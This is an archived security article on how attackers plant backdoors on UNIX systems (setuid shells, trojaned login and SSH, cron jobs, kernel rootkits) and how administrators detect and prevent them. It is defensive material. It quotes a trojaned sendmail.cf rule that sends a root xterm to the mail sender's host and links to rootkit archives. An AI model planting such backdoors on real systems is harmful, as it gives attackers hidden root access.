@@ -1,0 +1,203 @@
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML//EN">
+<html>
+<HEAD><META NAME="ROBOTS" CONTENT="NOARCHIVE">
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+<meta name="GENERATOR" content="Microsoft FrontPage 2.0">
+<title>Kurt Seifried - Informaiton security / Technical</title>
+</head>
+<body bgcolor="#FFFFFF" marginwidth="0" marginheight="0">
+<h1>Creating and Preventing Backdoors in UNIX Systems</h1>
+<p>Kurt Seifried, <a href="/cdn-cgi/l/email-protection#e388969197a390868a85918a8687cd8c9184"><span class="__cf_email__" data-cfemail="19726c6b6d596a7c707f6b707c7d37766b7e">[email&#160;protected]</span><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script></a>,
+Copyright Kurt Seifried 2001</p>
+<hr>
+<p><b></b>&nbsp;</p>
+<p><b>June 28, 2000 - </b>Backdoors are by far one of the worst
+nightmares of many system and network administrators. We all know
+our networks and hosts will at some point be penetrated, and if
+we've done our job right we should be able to detect that
+penetration. However, one problem always rears its ugly head: Do
+we format the drive, reinstall from trusted media, then patch the
+system, configure it, and restore data from backups; or do we
+just try to patch the system up and remove any surprises the
+attacker may have left? In some cases it is clear-cut: For a
+user's workstation with most data stored centrally, rebuilding
+the system is far faster than trying to fix it. On the other
+hand, what if you have a production email server handling
+incoming email for 10,000 people and no backup machine to switch
+to? </p>
+<p>As with any security problem, we need to understand this
+completely, which means learning how an attacker can place
+backdoors on a system. Working from this point, it's relatively
+simple to devise defenses. Because of the complexity in most UNIX
+systems (network daemons, hundreds of installed programs, etc.),
+there are many methods and places to squirrel away backdoors.
+Basically, the attacker needs to have some form of network access
+to the machine, e.g. a telnet account or the ability to send ICMP
+packets. Also necessary is compromised software on the machine,
+e.g. a setuid shell hidden in their home directory, or a Trojaned
+login binary. </p>
+<p>&nbsp;</p>
+<h2>Hidden setuid/setgid Shells</h2>
+<p>Once the attacker gains root, they simply make a copy of
+/bin/bash (or their favorite shell), set its ownership to the
+user or group root, and then set it setuid or setgid. Thus, when
+they run the shell it runs with root privileges, and they can do
+whatever they want to on the system. This is a somewhat clumsy
+method, since such shells are easily detected by a simple</p>
+<blockquote>
+<p>find / -perm +6000 </p>
+</blockquote>
+<p>compared to a previous list of setuid and setgid binaries. To
+avoid this, the attacker can simply label their setuid shell as a
+normal (but unused) setuid program such as /sbin/restore. The
+best way to detect this type of activity is to use a secure
+cryptographic algorithm such as SHA1 to create signatures of
+binary files, and compare them to detect any changes.
+Additionally, you should audit the system for setuid and setgid
+programs and try to remove as many of them as possible. Most
+modern systems don't need the vast majority of them. An extension
+of this is setuid/setgid programs that can be abused to gain root
+access, for example dump. It is critical to keep these programs
+up to date, which is one reason removing them is a very good
+idea. </p>
+<p>&nbsp;</p>
+<h2>Trojaned Binaries and Configuration Files</h2>
+<p>Any network daemons that run with root privileges, which many
+of them do, are a prime target for compromise. There are versions
+of login which, when fed a certain username (&quot;gotroot?&quot;
+for example), spawn off a root shell without prompting for a
+password. In addition, the more complicated a daemon is, the more
+room for implanting a Trojan. A perfect example of this is
+Sendmail. The following is output of a diff from a compromised
+Red Hat 6.0 box's /etc/sendmail.cf:</p>
+<pre>	# 1) Part
+	# Here we define the Class(Like Array) of k85a86,87
+	&gt; # Trojan Class definition
+	&gt; Cktrojanhorse
+	# 2) Part
+	# here in Rules S0 we place a condition
+	# LHS RHS Comment
+	# If the format of e-mail is:
+	# &quot;one of element in Class k&quot;@Something
+	# then deliver through hack mailer, assign $2 to host
+	# and $1 to username 605a608
+	&gt; R$=k &lt; @$* &gt; $* $#hack $@ $2 $: $1 Trojan Mailer redirect
+	# 3) Part
+	# This is important, here we define the action... we send
+	# an xterm to sender host 1157a1161,1164
+	&gt;
+	&gt; # Trojan Mailer
+	&gt; Mhack, P=/usr/X11R6/bin/xterm, F=FMAlsSux, S=10/30, R=0,
+	&gt; D=$z:/, A=xterm -display $s:0.0
+  </pre>
+<p>With this, all the attacker has to do is telnet to the box and
+manually send mail as from <a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="5a2935373f35343f1a2e2835303b34323528293f">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/javascript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>, and they receive
+an xterm running as root on their box. This technique has the
+disadvantage of being clear text in a config file. However, very
+few administrators will ever dig through their sendmail.cf line
+by line. The advantage is that if an admin does run software such
+as Tripwire and notices that sendmail.cf has changed, they may
+think it is routine system maintenance. One method to prevent
+this type of behavior is to use <a href="http://www.wirex.com/subdomain.html">SubDomain</a>, which
+prevents programs from accessing files and executing binaries
+they shouldn't.</p>
+<p>Another exploit floating around is a set of patches for SSH
+that allow for the logging of passwords to a secret log file.
+This one is particularly nasty for several reasons:</p>
+<ul>
+<li>Most users use the same passwords for multiple
+accounts/services. </li>
+<li>This file of passwords might be discovered by less
+sophisticated attackers, who in turn may cause much
+damage.</li>
+</ul>
+<p>Once an attacker gains root, the possibilities are endless.
+This is why it is critical to have capabilities in place to
+detect intrusions and their extent.</p>
+<p>&nbsp;</p>
+<h2>Running Programs Automatically</h2>
+<p>Another way to get an xterm running as root to appear on your
+machine would be to use cron, a program that runs tasks at
+specified times. By editing root's crontab, or system crontab
+entries, an attacker could easily set it to run xterm at 4:27
+a.m. on every Wednesday - something most administrators would not
+notice unless they checked their crontab entries regularly.
+Restricting user access to cron and checking root's and the
+system crontab entries regularly is encouraged. Another sneaky
+way would be to modify a system script that is run weekly, say,
+the script that runs &quot;updatedb&quot; (usually at 4 a.m.
+Sunday), to fire up an xterm (or whatever) to the attackers
+machine. Again, the best way to deal with this is to use Tripwire
+or similar software to monitor changes to programs and
+configuration files. It is also a good idea to backup these files
+so you can compare them in future (using diff, for example).</p>
+<p>&nbsp;</p>
+<h2>Exploiting Known Holes</h2>
+<p>Most systems have at least a few exploitable holes. If the
+attacker is feeling brave and doesn't want to leave any traces,
+they may elect to simply re-exploit the machine each time they
+want to get in. This technique is quite effective at
+universities, which tend to have hundreds and sometimes thousands
+of poorly (if at all) maintained UNIX machines on their networks.
+</p>
+<p>&nbsp;</p>
+<h2>Kernel Rootkits</h2>
+<p>Rootkits are sets of tools to replace such system binaries as
+ls and ps, so that the attacker can evade detection. These can be
+found relatively quickly if the system is using a program such as
+Tripwire correctly. However there is a better way to skin the
+proverbial cat. By using a kernel rootkit, you can effectively
+hide it from the admin with almost a 100% guarantee. Because it
+is at such a low level of the system - at the kernel - it can
+block and manipulate system calls, such as ones used to query
+what kernel modules are loaded, what is in memory, and so on.
+There are several defenses against this:</p>
+<ul>
+<li>Disable loadable kernel modules. </li>
+<li>Remove kernel module manipulation tools. Note that the
+attacker will probably then just upload their own. </li>
+<li>Keep a copy of the current kernel and any needed modules
+on trusted removable media. Consider rebooting the server
+once in a while off of trusted media and copying the
+trusted kernel and modules in. </li>
+</ul>
+<p>&nbsp;</p>
+<h2>Summary</h2>
+<p>In UNIX, and to a large extent in any modern network OS, there
+are hundreds of hiding places to put backdoors and Trojans in.
+The best way to defend against them is to reduce the complexity
+of the system. For example, each server should have one primary
+function, i.e. DNS, SMTP, POP, WWW, and so on. Remove any
+unneeded software, especially anything that uses setuid or setgid
+binaries. If possible, disable things such as kernel modules and
+compile a static kernel. The chance to save 50K of memory by
+having the tape drive support compiled in as a module generally
+isn't worth the bother. Use multiple layers of security - for
+example, have a firewall that blocks all outgoing packets except
+for certain kinds, and possibly logs all the packets during off
+hours. This way, if an attacker installs software that
+&quot;dials&quot; home (for example, by sending out an xterm) the
+firewall might block it, or at least log it. Install and use
+software like Tripwire properly, and have a set of valid check
+sums.</p>
+<hr>
+<p><b>Reference links:</b></p>
+<p><b>NT Rootkit</b><br>
+<a href="http://www.rootkit.com/">http://www.rootkit.com/</a> </p>
+<p><b>Back Orifice 2000</b><br>
+<a href="http://www.bo2k.com/">http://www.bo2k.com/</a></p>
+<p><b>Rootkits</b><br>
+Forty-nine backdoor exploits ranging from the SSH patches to full
+rootkits for Linux and Solaris, including kernel rootkits<br>
+<a href="http://packetstorm.securify.com/UNIX/penetration/rootkits/">http://packetstorm.securify.com/UNIX/penetration/rootkits/</a>
+</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<hr>
+<p><a href="./">Back</a></p>
+<p>Last updated 20/12/2001</p>
+<p>Copyright Kurt Seifried 2001</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<script type="text/javascript">/* <![CDATA[ */(function(d,s,a,i,j,r,l,m,t){try{l=d.getElementsByTagName('a');t=d.createElement('textarea');for(i=0;l.length-i;i++){try{a=l[i].href;s=a.indexOf('/cdn-cgi/l/email-protection');m=a.length;if(a&&s>-1&&m>28){j=28+s;s='';if(j<m){r='0x'+a.substr(j,2)|0;for(j+=2;j<m&&a.charAt(j)!='X';j+=2)s+='%'+('0'+('0x'+a.substr(j,2)^r).toString(16)).slice(-2);j++;s=decodeURIComponent(s)+a.substr(j,m-j)}t.innerHTML=s.replace(/</g,'&lt;').replace(/>/g,'&gt;');l[i].href='mailto:'+t.value}}catch(e){}}}catch(e){}})(document);/* ]]> */</script></body>
+</html>
